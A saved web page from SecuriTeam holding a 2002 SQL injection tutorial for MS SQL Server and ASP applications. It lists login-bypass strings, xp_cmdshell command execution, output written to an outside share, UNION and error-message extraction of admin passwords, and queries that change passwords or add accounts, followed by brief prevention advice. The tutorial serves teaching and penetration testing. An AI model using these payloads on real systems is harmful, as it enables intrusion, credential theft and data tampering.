@@ -1,0 +1,700 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html><head>
+<meta name="Description" content="Beyond Security will help you expose your security holes and will show you what the bad guys already know about your hosts and network. Use our Automated Scanning service to perform a full security audit of your site, and find the latest security news and tools on Beyond Security's SecuriTeam web site.">
+<meta name="Keywords" content="Beyond Security, automated scanning, security news, security, hack, hacker, hacking, crack, cracker, cracking, exploits, securiteam, root, intrusion detection, windows, windowsnt, nt, server, unix, linux, solaris, sunos, aix, audit, firewall, scanner, internet, intranet, vulnerability, phreak, redhat, suse, debian, rootshell, maximum, tcpip, udp, tcp, cryptography, hunt, session, hijack, reset, ack, syn, rst">
+<meta http-equiv="expires" content="01 Jan  1998 01:01:00 GMT">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="HandheldFriendly" content="True">
+<meta name="htdig-notification-date" content="26/5/2002">
+<script language="Javascript">
+<!-- Hide this
+function PopUp(what){
+window.open(what,'PopUp','top=100, screenx=100, left=100, screeny=100, width=560, height=350, buttons=no, scrollbars=no, location=no, menubar=no, resizable=no, status=no, directories=no, toolbar=no');}
+// Done -->
+</script>
+<style type="text/css">
+body
+{
+  background-position: top left ;
+  background-attachment: fixed;
+  background-repeat: no-repeat;
+  background-image: url("/images/securiteam-logo-stretched.png");
+  padding: 0px 0px 0px 22px;
+}
+</style>
+<link rel="stylesheet" href="sql_injection_walkthrough_files/securiteam-style.css">
+
+<title>SecuriTeam.com ™ - SQL Injection Walkthrough</title></head>
+
+<body bgcolor="#ffffff">
+<div id="MainDIV">
+  <!-- BeginGoogle -->
+  <center><img src="sql_injection_walkthrough_files/advertisement.gif" alt="Advertisement"></center>
+  <div style="margin-left: auto; margin-right: auto;" align="center">
+  <script type="text/javascript"><!--
+  google_ad_client = "pub-6016331925075353";
+  google_alternate_ad_url = "http://www.beyondsecurity.com/automated-banner.htm";
+  google_ad_width = 728;
+  google_ad_height = 90;
+  google_ad_format = "728x90_as";
+  google_ad_channel ="1229309344";
+  google_color_border = "FFFFFF";
+  google_color_bg = "FFFFFF";
+  google_color_link = "000051";
+  google_color_url = "000051";
+  google_color_text = "000051";
+  //--></script>
+  <script type="text/javascript" src="sql_injection_walkthrough_files/show_ads">
+  </script>
+  </div>
+  <!-- EndGoogle -->
+ <table id="MainTABLE" style="margin-left: auto; margin-right: auto;" border="0" cellpadding="1" cellspacing="1">
+  <tbody><tr>
+  <td>&nbsp;</td>
+   <td class="ArticleSection" style="text-align: center;">
+    &nbsp;<a href="http://www.securiteam.com/securitynews/">Security News</a> -
+    &nbsp;<a href="http://www.securiteam.com/securityreviews/">Security Reviews</a> -
+    &nbsp;<a href="http://www.securiteam.com/exploits/"> Exploits</a> -
+    &nbsp;<a href="http://www.securiteam.com/tools/">Tools</a> -
+    &nbsp;<a href="http://www.securiteam.com/unixfocus/">UNIX Focus</a> -
+    &nbsp;<a href="http://www.securiteam.com/windowsntfocus/">Windows Focus</a>
+    <hr style="margin-left: auto; margin-right: auto;">
+   </td>
+  <td>&nbsp;</td>
+  </tr>
+<!--htdig_noindex-->
+  <tr id="MainLinksArticlesLinks">
+   <td id="MainLinks" valign="top" width="15%">
+    <p>
+     &nbsp;<a class="sidebarlink" href="http://www.securiteam.com/aboutus.html">SecuriTeam</a><br>
+     &nbsp;<a class="sidebarlink" href="http://www.beyondsecurity.com/">Beyond Security</a><br>
+     <br>
+     &nbsp;<a class="sidebarlink" href="http://www.securiteam.com/" style="font-weight: bold;">SecuriTeam Home</a><br>
+     &nbsp;<a class="sidebarlink" href="http://www.securiteam.com/askus.html">Ask the Team</a><br>
+     &nbsp;<a class="sidebarlink" href="http://www.securiteam.com/mailinglist.html">Mailing Lists</a><br>
+     &nbsp;<a class="sidebarlink" href="http://www.securiteam.com/ads.html">Advertising Info</a><br>
+     <br>
+     <br>
+    </p>
+    <table cellpadding="0" cellspacing="0">
+    <tbody><tr>
+     <td valign="top"><img src="sql_injection_walkthrough_files/envelope.gif" alt="Envelope" height="12" width="16"></td><td><a class="sidebarlink" href="mailto:list-subscribe@securiteam.com?Subject=Subscribe">SecuriTeam in Your Inbox</a></td>
+    </tr>
+	<tr>
+	 <td colspan="2">&nbsp;</td>
+	</tr><tr>
+	 <td valign="top"><img src="sql_injection_walkthrough_files/envelope.gif" alt="Email" align="left" border="0" height="12" width="16"></td><td><a class="sidebarlink" onclick="javascript: PopUp('/cgi-bin/email.pl?Section=securityreviews&Filename=5DP0N1P76E'); return false;" href="http://www.securiteam.com/cgi-bin/email.pl?Section=securityreviews&amp;Filename=5DP0N1P76E">E-mail this article to a friend</a><br></td>
+	</tr>
+    </tbody></table>
+    <br>
+    <br>
+    <a class="sidebarlink" href="mailto:news@securiteam.com" style="color: red; font-weight: bold;">New vulnerability?<br>New tool?<br>Tell us</a><br>
+
+    <br>
+    <a href="http://www.securiteam.com/securiteam.rss"><img src="sql_injection_walkthrough_files/rss-whitebg.gif" alt="RSS" border="0"></a>
+    <br>
+   </td><!-- MainLinks -->
+
+<!--/htdig_noindex-->
+  <td id="Articles" class="fd" align="center" valign="top">
+   <table id="ArticleSection" style="width: 100%;" border="0">
+   <tbody><tr id="ContentSectionsTop">
+    <td class="ArticleSection" align="center">
+     <table id="ArticleTABLE" style="width: 100%;" border="0">
+      <tbody><tr>
+       <td>
+        <table id="ArticleTitle" width="100%">
+         <tbody><tr>
+          <td class="header" style="font-size: 150%;" width="80%">SQL Injection Walkthrough</td>
+          <td class="header" style="text-align: right;">26 May 2002</td>
+         </tr>
+        </tbody></table>
+       </td>
+      </tr>
+      <tr>
+       <td>&nbsp;</td>
+      </tr>
+      <tr>
+       <td class="header" style="background: rgb(138, 140, 226) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; color: rgb(255, 255, 255);">&nbsp;Summary</td>
+      </tr>
+      
+      <tr align="left">
+       <td>The
+following article will try to help beginners with grasping the problems
+facing them while trying to utilize SQL Injection techniques, to
+successfully utilize them, and to protect themselves from such attacks.
+</td>
+      </tr>
+      <tr>
+       <td>&nbsp;</td>
+      </tr>
+      
+      <tr align="left">
+       <td><b>Credit:</b><br>
+       The information has been provided by <a href="mailto:sk%20at%20scan-associates.net">SK</a>.
+
+       </td>
+      </tr>
+      <tr>
+       <td>&nbsp;</td>
+      </tr>
+      <tr>
+       <td class="header" style="background: rgb(138, 140, 226) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; color: rgb(255, 255, 255);">&nbsp;Details</td>
+      </tr>
+      <tr align="left">
+       <td><b>1.0 Introduction</b><br>When
+a machine has only port 80 opened, your most trusted vulnerability
+scanner cannot return anything useful, and you know that the admin
+always patch his server, we have to turn to web hacking. SQL injection
+is one of type of web hacking that require nothing but port 80 and it
+might just work even if the admin is patch-happy. It attacks on the web
+application (like ASP, JSP, PHP, CGI, etc) itself rather than on the
+web server or services running in the OS.<br>
+<br>
+This article does not introduce anything new, SQL injection has been
+widely written and used in the wild. We wrote the article because we
+would like to document some of our pen-test using SQL injection and
+hope that it may be of some use to others. You may find a trick or two
+but please check out the "9.0 Where can I get more info?" for people
+who truly deserve credit for developing many techniques in SQL
+injection.<br>
+<br>
+<b>1.1 What is SQL Injection?</b><br>
+It is a trick to inject SQL query/command as an input possibly via web
+pages. Many web pages take parameters from web user, and make SQL query
+to the database. Take for instance when a user login, web page that
+user name and password and make SQL query to the database to check if a
+user has valid name and password. With SQL Injection, it is possible
+for us to send crafted user name and/or password field that will change
+the SQL query and thus grant us something else.<br>
+<br>
+<b>1.2 What do you need?</b><br>
+Any web browser.<br>
+<br>
+<b>2.0 What you should look for?</b><br>
+Try to look for pages that allow you to submit data, i.e: login page,
+search page, feedback, etc. Sometimes, HTML pages use POST command to
+send parameters to another ASP page. Therefore, you may not see the
+parameters in the URL. However, you can check the source code of the
+HTML, and look for "FORM" tag in the HTML code. You may find something
+like this in some HTML codes:<br>
+&lt;FORM action=Search/search.asp method=post&gt;<br>
+&lt;input type=hidden name=A value=C&gt;<br>
+&lt;/FORM&gt;<br>
+<br>
+Everything between the &lt;FORM&gt; and &lt;/FORM&gt; have potential parameters that might be useful (exploit wise).<br>
+<br>
+<br>
+<b>2.1 What if you can't find any page that takes input?</b><br>
+You should look for pages like ASP, JSP, CGI, or PHP web pages. Try to look especially for URL that takes parameters, like:<br>
+<br>
+http://duck/index.asp?id=10<br>
+<br>
+<b>3.0 How do you test if it is vulnerable?</b><br>
+Start with a single quote trick. Input something like:<br>
+<br>
+hi' or 1=1--<br>
+<br>
+Into login, or password, or even in the URL. Example:<br>
+&nbsp;- Login: hi' or 1=1--<br>
+&nbsp;- Pass: hi' or 1=1--<br>
+&nbsp;- http://duck/index.asp?id=hi' or 1=1--<br>
+<br>
+If you must do this with a hidden field, just download the source HTML
+from the site, save it in your hard disk, modify the URL and hidden
+field accordingly. Example:<br>
+<br>
+&lt;FORM action=http://duck/Search/search.asp method=post&gt;<br>
+&lt;input type=hidden name=A value="hi' or 1=1--"&gt;<br>
+&lt;/FORM&gt;<br>
+<br>
+If luck is on your side, you will get login without any login name or password. <br>
+<br>
+<b>3.1 But why ' or 1=1--?</b><br>
+Let us look at another example why ' or 1=1-- is important. Other than
+bypassing login, it is also possible to view extra information that is
+not normally available. Take an asp page that will link you to another
+page with the following URL:<br>
+<br>
+http://duck/index.asp?category=food<br>
+<br>
+In the URL, 'category' is the variable name, and 'food' is the value
+assigned to the variable. In order to do that, an ASP might contain the
+following code (OK, this is the actual code that we created for this
+exercise):<br>
+<br>
+v_cat = request("category")<br>
+sqlstr="SELECT * FROM product WHERE PCategory='" &amp; v_cat &amp; "'"<br>
+set rs=conn.execute(sqlstr)<br>
+<br>
+As we can see, our variable will be wrapped into v_cat and thus the SQL statement should become:<br>
+<br>
+SELECT * FROM product WHERE PCategory='food'<br>
+<br>
+The query should return a resultset containing one or more rows that match the WHERE condition, in this case, 'food'.<br>
+<br>
+Now, assume that we change the URL into something like this:<br>
+<br>
+http://duck/index.asp?category=food' or 1=1--<br>
+<br>
+Now, our variable v_cat equals to "food' or 1=1-- ", if we substitute this in the SQL query, we will have:<br>
+<br>
+SELECT * FROM product WHERE PCategory='food' or 1=1--'<br>
+<br>
+The query now should now select everything from the product table
+regardless if PCategory is equal to 'food' or not. A double dash "--"
+tell MS SQL server ignore the rest of the query, which will get rid of
+the last hanging single quote ('). Sometimes, it may be possible to
+replace double dash with single hash "#".<br>
+<br>
+However, if it is not an SQL server, or you simply cannot ignore the rest of the query, you also may try<br>
+<br>
+' or 'a'='a<br>
+<br>
+The SQL query will now become:<br>
+<br>
+SELECT * FROM product WHERE PCategory='food' or 'a'='a'<br>
+<br>
+It should return the same result.<br>
+<br>
+Depending on the actual SQL query, you may have to try some of these possibilities:<br>
+<br>
+' or 1=1--<br>
+" or 1=1--<br>
+or 1=1--<br>
+' or 'a'='a<br>
+" or "a"="a<br>
+') or ('a'='a<br>
+<br>
+<b>4.0 How do I get remote execution with SQL injection?</b><br>
+Being able to inject SQL command usually mean, we can execute any SQL
+query at will. Default installation of MS SQL Server is running as
+SYSTEM, which is equivalent to Administrator access in Windows. We can
+use stored procedures like master..xp_cmdshell to perform remote
+execution:<br>
+<br>
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--<br>
+<br>
+Try using double quote (") if single quote (') is not working.<br>
+<br>
+The semi colon will end the current SQL query and thus allow you to
+start a new SQL command. To verify that the command executed
+successfully, you can listen to ICMP packet from 10.10.1.2, check if
+there is any packet from the server:<br>
+<br>
+#tcpdump icmp<br>
+<br>
+If you do not get any ping request from the server, and get error
+message indicating permission error, it is possible that the
+administrator has limited Web User access to these stored procedures.<br>
+<br>
+<b>5.0 How to get output of my SQL query?</b><br>
+It is possible to use sp_makewebtask to write your query into an HTML:<br>
+<br>
+'; EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"<br>
+<br>
+But the target IP must folder "share" sharing for Everyone.<br>
+<br>
+<b>6.0 How to get data from the database using ODBC error message</b><br>
+We can use information from error message produced by the MS SQL Server
+to get almost any data we want. Take the following page for example:<br>
+<br>
+http://duck/index.asp?id=10 <br>
+<br>
+We will try to UNION the integer '10' with another string from the database:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--<br>
+<br>
+The system table INFORMATION_SCHEMA.TABLES contains information of all
+tables in the server. The TABLE_NAME field obviously contains the name
+of each table in the database. It was chosen because we know it always
+exists. Our query:<br>
+<br>
+SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-<br>
+<br>
+This should return the first table name in the database. When we UNION
+this string value to an integer 10, MS SQL Server will try to convert a
+string (nvarchar) to an integer. This will produce an error, since we
+cannot convert nvarchar to int. The server will display the following
+error:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
+the nvarchar value 'table1' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+The error message is nice enough to tell us the value that cannot be
+converted into an integer. In this case, we have obtained the first
+table name in the database, which is "table1".<br>
+<br>
+To get the next table name, we can use the following query:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--<br>
+<br>
+We also can search for data using LIKE keyword:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25login%25'--<br>
+<br>
+Output:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
+the nvarchar value 'admin_login' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+The matching patent, '%25login%25' will be seen as %login% in SQL
+Server. In this case, we will get the first table name that matches the
+criteria, "admin_login".<br>
+<br>
+<b>6.1 How to mine all column names of a table?</b><br>
+We can use another useful table INFORMATION_SCHEMA.COLUMNS to map out all columns name of a table:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--<br>
+<br>
+Output:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
+the nvarchar value 'login_id' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+Now that we have the first column name, we can use NOT IN () to get the next column name:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM
+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE
+COLUMN_NAME NOT IN ('login_id')--<br>
+<br>
+Output:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
+the nvarchar value 'login_name' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+When we continue further, we obtained the rest of the column name, i.e.
+"password", "details". We know this when we get the following error
+message:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM
+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE
+COLUMN_NAME NOT IN ('login_id','login_name','password',details')--<br>
+<br>
+Output:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]ORDER BY items must
+appear in the select list if the statement contains a UNION operator. <br>
+/index.asp, line 5<br>
+<br>
+<b>6.2 How to retrieve any data we want?</b><br>
+Now that we have identified some important tables, and their column, we
+can use the same technique to gather any information we want from the
+database.<br>
+<br>
+Now, let's get the first login_name from the "admin_login" table:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 login_name FROM admin_login--<br>
+<br>
+Output:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'neo' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+We now know there is an admin user with the login name of "neo". Finally, to get the password of "neo" from the database:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--<br>
+<br>
+Output:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
+the nvarchar value 'm4trix' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+We can now login as "neo" with his password "m4trix".<br>
+<br>
+<b>6.3 How to get numeric string value?</b><br>
+There is limitation with the technique describe above. We cannot get
+any error message if we are trying to convert text that consists of
+valid number (character between 0-9 only). Let say we are trying to get
+password of "trinity" which is "31173":<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--<br>
+<br>
+We will probably get a "Page Not Found" error. The reason being, the
+password "31173" will be converted into a number, before UNION with an
+integer (10 in this case). Since it is a valid UNION statement, SQL
+server will not throw ODBC error message, and thus, we will not be able
+to retrieve any numeric entry.<br>
+<br>
+To solve this problem, we can append the numeric string with some
+alphabets to make sure the conversion fail. Let us try this query
+instead:<br>
+<br>
+http://duck/index.asp?id=10 UNION SELECT TOP 1 convert(int,
+password%2b'%20morpheus') FROM admin_login where login_name='trinity'--<br>
+<br>
+We simply use a plus sign (+) to append the password with any text we
+want. (ASSCII code for '+' = 0x2b). We will append '(space)morpheus'
+into the actual password. Therefore, even if we have a numeric string
+'31173', it will become '31173 morpheus'. By manually calling the
+convert() function, trying to convert '31173 morpheus' into an integer,
+SQL Server will throw out ODBC error message:<br>
+<br>
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' <br>
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting
+the nvarchar value '31173 morpheus' to a column of data type int. <br>
+/index.asp, line 5<br>
+<br>
+Now, you can even login as 'trinity' with the password '31173'.<br>
+<br>
+<b>7.0 How to update/insert data into the database?</b><br>
+When we successfully gather all column name of a table, it is possible
+for us to UPDATE or even INSERT a new record in the table. For example,
+to change password for "neo":<br>
+<br>
+http://duck/index.asp?id=10; UPDATE 'admin_login' SET 'password' = 'newpas5' WHERE login_name='neo'--<br>
+<br>
+To INSERT a new record into the database:<br>
+<br>
+http://duck/index.asp?id=10; INSERT INTO 'admin_login' ('login_id',
+'login_name', 'password', 'details') VALUES
+(666,'neo2','newpas5','NA')--<br>
+<br>
+We can now login as "neo2" with the password of "newpas5".<br>
+<br>
+<b>8.0 How to avoid SQL Injection?</b><br>
+Filter out character like single quote, double quote, slash, back
+slash, semi colon, extended character like NULL, carry return, new
+line, etc, in all strings from:<br>
+&nbsp;- Input from users<br>
+&nbsp;- Parameters from URL<br>
+&nbsp;- Values from cookie<br>
+<br>
+For numeric value, convert it to an integer before parsing it into SQL
+statement. Or using ISNUMERIC to make sure it is an integer.<br>
+<br>
+Change "Startup and run SQL Server" using low privilege user in SQL Server Security tab.<br>
+<br>
+Delete stored procedures that you are not using like:<br>
+<br>
+master..Xp_cmdshell, xp_startmail, xp_sendmail, sp_makewebtask<br>
+<br>
+<br>
+<b>9.0 Where can I get more info?</b><br>
+One of the earliest works on SQL Injection we have encountered should
+be the paper from Rain Forest Puppy about how he hacked PacketStorm.<br>
+<a href="http://www.wiretrip.net/rfp/p/doc.asp?id=42&amp;iface=6">http://www.wiretrip.net/rfp/p/doc.asp?id=42&amp;iface=6</a><br>
+<br>
+Great article on gathering information from ODBC error messages:<br>
+<a href="http://www.blackhat.com/presentations/win-usa-01/Litchfield/BHWin01Litchfield.doc">http://www.blackhat.com/presentations/win-usa-01/Litchfield/BHWin01Litchfield.doc</a><br>
+<br>
+A good summary of SQL Injection on various SQL Server on <br>
+<a href="http://www.owasp.org/asac/input_validation/sql.shtml">http://www.owasp.org/asac/input_validation/sql.shtml</a> <br>
+<br>
+Senseport's article on reading SQL Injection:<br>
+<a href="http://www.sensepost.com/misc/SQLinsertion.htm">http://www.sensepost.com/misc/SQLinsertion.htm</a> <br>
+<br>
+Other worth readings:<br>
+<a href="http://www.digitaloffense.net/wargames01/IOWargames.ppt">http://www.digitaloffense.net/wargames01/IOWargames.ppt</a> <br>
+<a href="http://www.wiretrip.net/rfp/p/doc.asp?id=7&amp;iface=6">http://www.wiretrip.net/rfp/p/doc.asp?id=7&amp;iface=6</a> <br>
+<a href="http://www.wiretrip.net/rfp/p/doc.asp?id=60&amp;iface=6">http://www.wiretrip.net/rfp/p/doc.asp?id=60&amp;iface=6</a><br>
+<a href="http://www.spidynamics.com/whitepapers/WhitepaperSQLInjection.pdf">http://www.spidynamics.com/whitepapers/WhitepaperSQLInjection.pdf</a>
+</td>
+      </tr>
+     </tbody></table><!-- ArticleTABLE -->
+   
+   </td>
+   </tr><!-- ContentArticlesNonFeatured -->
+  </tbody></table><!-- ArticleSection -->
+ </td><!-- Articles -->
+  
+ <td id="RightSidebar" class="fd" valign="top" width="20%">
+  <table id="RightSidebarTable" border="0" width="100%">
+   <tbody><tr>
+    <td id="SearchSecuriTeam">
+      <table id="SearchTABLE" border="0" cellpadding="0" cellspacing="0">
+      <tbody><tr>
+      <td>
+       <form method="post" action="/cgi-bin/htsearch">
+       <input name="words" value="Search" maxlength="100" size="20" type="text"><br>
+       <input name="method" value="and" type="hidden">
+     <input name="format" value="builtin-long" type="hidden">
+     <input name="sort" value="score" type="hidden">
+      <select name="restrict"><option value="">All Sections
+      </option><option value="/securitynews/">Security News
+      </option><option value="/unixfocus/">Unix focus
+      </option><option value="/exploits/">Exploits
+      </option><option value="/tools">Tools
+      </option><option value="/windowsntfocus">Windows focus
+      </option><option value="/securityreviews">Security Reviews
+      </option></select>
+      <input name="exclude" value="" type="hidden">
+      <input src="sql_injection_walkthrough_files/search-whitebg.gif" alt="Search" type="image"></form>
+     </td>
+      </tr>
+     </tbody></table><!-- SearchTABLE -->
+     </td><!-- SearchSecuriTeam -->
+   </tr>
+   <tr>
+  <td id="ToolsExploitsFeaturedLinks" class="fd" valign="top" width="20%">
+  <div style="background: rgb(138, 140, 226) none repeat scroll 0%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial;" align="center"><a style="color: white; font-weight: bold;" href="http://www.securiteam.com/survey/">What do you think about our new design?</a></div>
+    <br>
+   <table id="ToolsExploitsFeaturedLinksTable" width="100%">
+<!--htdig_noindex-->
+    <tbody><tr>
+     <td class="headersidebar"><a class="sectiontitle">&nbsp;Related Articles</a></td>
+    </tr>
+    <tr>
+     <td class="rightsidebar" align="left">
+      <table>
+       
+  	   <tbody><tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/5IP032KELK.html">Hacking Bluetooth Enabled Mobile Phones and Beyond</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6S00B1PC0U.html">Security Deficiencies of Automated Windows Installations</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6N00C0KC0Q.html">Multiple Collisions attack on MD5 and other Hashing Algorithms</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6Z00H20BQS.html">Red Pill... Or How To Detect VMM Using (Almost) One CPU Instruction</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6Y00H20BPA.html">Exploiting Default Exception Handler to Increase Exploit Stability Under Win32</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6A00D1PBQI.html">Writing IA32 Restricted Instruction Set Shellcode Decoder Loops</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6L0020UBPW.html">Second Order Code Injection Attacks</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6S0030ABPE.html">Bypassing Client Application Protection Techniques</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6K00M2ABFM.html">An Analysis of Skype VoIP Application For Use in a Corporate Environment</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6Q00L00BFI.html">Introduction to Shellcoding - How to Exploit Buffer Overflows</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6Z00B2ABFO.html">GDI+ JPEG Exploit Mutations Can Bypass Antivirus Tests</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6K00D20BFW.html">Common Firewall Configuration Errors</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6A0051PBFG.html">Using the oc192-Dcom.c Exploit to Accomplish Revenge</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/6Z0041PBFY.html">Worm Analysis - Microsoft LSASS Buffer Overflow from Exploit to Worm</a></td>
+       </tr>
+       
+  	   <tr>
+ 	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securityreviews/5HP0N2KE0I.html">Microsoft PCT Exploit Analysis</a></td>
+       </tr>
+       
+      </tbody></table>
+      <br>
+     </td>
+    </tr>
+    <tr>
+     <td class="headersidebar">&nbsp;Featured Articles</td>
+    </tr>
+    <tr>
+     <td class="rightsidebar" align="left">
+      <table>
+       
+       <tbody><tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/unixfocus/5WP0B2KEKK.html">Multiple UNIX/Linux Vendor Xpdf makeFileKey2 Stack Overflow</a></td>
+       </tr>
+       
+       <tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/windowsntfocus/5OP0D2AEKM.html">Netegrity SiteMinder smpwservicescgi.exe Target Redirection</a></td>
+       </tr>
+       
+       <tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/unixfocus/5NP0C2AEKC.html">Multiple Vendor ImageMagick .psd Image File Decode Heap Overflow Vulnerability</a></td>
+       </tr>
+       
+       <tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/securitynews/5MP0B2AEKS.html">AWStats Remote Command Execution Vulnerability (configdir)</a></td>
+       </tr>
+       
+       <tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/windowsntfocus/5ZP0F20EKS.html">Internet Explorer Handling of %20 Allows Spoofing</a></td>
+       </tr>
+       
+       <tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/unixfocus/5BP0B1PELW.html">Apache mod_auth_radius Remote Integer Overflow (Exploit)</a></td>
+       </tr>
+       
+       <tr>
+	    <td style="vertical-align: top;"><img src="sql_injection_walkthrough_files/block.png" alt="&gt;"></td>
+        <td><a class="sidebarlink" href="http://www.securiteam.com/unixfocus/5AP0H0KEKU.html">Linux Kernel i386 SMP Page Fault Handler Privilege Escalation</a></td>
+       </tr>
+       
+      </tbody></table>
+      <br>
+     </td>
+    </tr>
